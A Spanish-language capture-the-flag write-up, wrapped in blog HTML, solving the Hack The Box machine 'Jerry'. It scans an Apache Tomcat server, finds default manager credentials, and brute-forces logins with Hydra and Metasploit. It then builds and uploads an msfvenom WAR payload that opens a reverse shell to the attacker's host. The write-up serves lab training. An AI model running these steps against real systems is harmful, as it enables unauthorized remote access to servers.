@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="/theme/css/elegant.prod.9e9d5ce754.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="/theme/css/custom.css" media="screen">
+
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+
+        <link rel="dns-prefetch" href="//fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+        <meta name="author" content="Alexis Imhoff" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="CTF, offensive, HTB, " />
+
+<meta property="og:title" content="Resolución de máquina Jerry "/>
+<meta property="og:url" content="/htb-jerry.html" />
+<meta property="og:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.95 Completed SYN Stealth Scan at 15:49, 26.59s elapsed (65535 total ports) Nmap scan report for 10.10.10.95 Host is up, received user-set (0.26s latency). Scanned at 2024-05-30 15 …" />
+<meta property="og:site_name" content="alimh blog" />
+<meta property="og:article:author" content="Alexis Imhoff" />
+<meta property="og:article:published_time" content="2024-10-24T00:00:00-03:00" />
+<meta name="twitter:title" content="Resolución de máquina Jerry ">
+<meta name="twitter:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.95 Completed SYN Stealth Scan at 15:49, 26.59s elapsed (65535 total ports) Nmap scan report for 10.10.10.95 Host is up, received user-set (0.26s latency). Scanned at 2024-05-30 15 …">
+
+        <title>Resolución de máquina Jerry  · alimh blog
+</title>
+
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="/"><span class=site-name>alimh blog</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       "/"
+                                    >Home</a>
+                                </li>
+                                <li ><a href="/categories.html">Categories</a></li>
+                                <li ><a href="/tags.html">Tags</a></li>
+                                <li ><a href="/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+              <div class="row-fluid">
+                <div class="span2"> 
+<aside id="sidebar">
+    <div class="about-me">
+        <img src="/images/avatar.webp" alt="Mi Foto" class="avatar">
+        <p>Hola! Soy Alexis Imhoff. Ingeniero en informática apasionado por la ciberseguridad. En este blog subiré writeups de CTFs y algun que otro tema relacionado a seguridad.</p>
+        <ul class="social-links">
+            <li>
+                <a href="https://www.linkedin.com/in/alexis-imhoff/" target="_blank" rel="noopener noreferrer">
+                    <i class="fab fa-linkedin"></i>
+                    <!-- Linkedin -->
+              </a>
+            </li>
+        </ul>
+    </div>
+</aside>
+                </div>
+              <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset1">
+        <h1>
+            <a href="/htb-jerry.html">
+                Resolución de máquina Jerry
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset1 article-content">
+            
+            <p><img alt="machine" src="images/images_htb_jerry/jerry_logo.jpg"></p>
+<h1>Enumeración</h1>
+<p>Escaneo de puertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.95
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Completed SYN Stealth Scan at 15:49, 26.59s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.95
+Host is up, received user-set (0.26s latency).
+Scanned at 2024-05-30 15:48:46 -03 for 26s
+Not shown: 65534 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    REASON
+8080/tcp open  http-proxy syn-ack ttl 127
+</code></pre></div>
+
+<p>Detectamos versión y servicio de los puertos abiertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -sCV -p8080 10.10.10.95
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Nmap scan report for 10.10.10.95
+Host is up (0.26s latency).
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/7.0.88
+|_http-server-header: Apache-Coyote/1.1
+</code></pre></div>
+
+<p>Utilizamos whatweb para enumerar qué tecnologías está utilizando:</p>
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-1.jpg"></p>
+<h3>Fuzzing de directorios</h3>
+<p>Si accedemos al sitio http://10.10.1.95:8080/ solo vemos el sitio por default de Apache. Vamos a hacer fuzzing utilizando <strong>gobuster</strong> para intentar encontrar directorios ocultos usando fuerza bruta:</p>
+<div class="highlight"><pre><span></span><code>gobuster dir -u http://10.10.10.95:8080 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span class="m">50</span>
+</code></pre></div>
+
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-2.jpg"></p>
+<p>Accedemos al http://10.10.10.95:8080/manager/ y nos pide credenciales. Probamos con admin / admin, ya que son las credenciales por default, pero obtenemos un <em>403 Access Denied</em>. De todas formas, en el mismo output vemos en texto claro los siguientes valores:</p>
+<div class="highlight"><pre><span></span><code>Username: tomcat
+Password: s3cret
+</code></pre></div>
+
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-3.jpg"></p>
+<p>Si volvemos a ingresar a http://10.10.10.95:8080/manager/ y proporcionamos estas credenciales, estamos dentro del <em>Gestor de Aplicaciones Web de Tomcat</em>.</p>
+<h3>Fuerza bruta de credenciales</h3>
+<p>Otra forma de obtener las credenciales es utilizando fuerza bruta.</p>
+<p><strong>Con Metasploit</strong></p>
+<p>Podemos usar el módulo <em>/auxiliary/scanner/http/tomcat_mgr_login</em>:</p>
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-4.jpg"></p>
+<p><strong>Con Hydra</strong></p>
+<div class="highlight"><pre><span></span><code>hydra -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
+</code></pre></div>
+
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-5.jpg"></p>
+<h1>Intrusión</h1>
+<p>Vemos que podemos subir archivos <strong>WAR</strong>:</p>
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-6.jpg"></p>
+<p>Por lo que vamos a generar un payload con <strong>msfvenom</strong> que nos de una Reverse Shell y vamos a intentar subirlo:</p>
+<div class="highlight"><pre><span></span><code>msfvenom -p java/jsp_shell_reverse_tcp -f war <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.102 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -o shell.war
+</code></pre></div>
+
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-7.jpg"></p>
+<p>Luego lo subimos:</p>
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-8.jpg"></p>
+<p>Nos quedamos a la escucha con netcat. Al ejecutar el archivo que subimos (haciendo click en /shell), obtenemos la Reverse Shell:</p>
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-9.jpg"></p>
+<p>Desde aquí ya podemos ver ambas flags:</p>
+<p><img alt="jerry" src="images/images_htb_jerry/htb_jerry-10.jpg"></p>
+<p>Para realizar la explotación con Metasploit podríamos utilizar el módulo <em>exploit/multi/http/tomcat_mgr_upload</em>.</p>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2024-10-24T00:00:00-03:00">jue 24 octubre 2024</time>
+            <h4>Category</h4>
+            <a class="category-link" href="/categories.html#htb-ref">HTB</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="/tags.html#ctf-ref">CTF
+                    <span class="superscript">9</span>
+</a></li>
+                <li><a href="/tags.html#offensive-ref">offensive
+                    <span class="superscript">11</span>
+</a></li>
+            </ul>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides.
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>              </div>
+            </div>
+        </div>
+<footer>
+
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script src="/theme/js/elegant.prod.9e9d5ce754.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
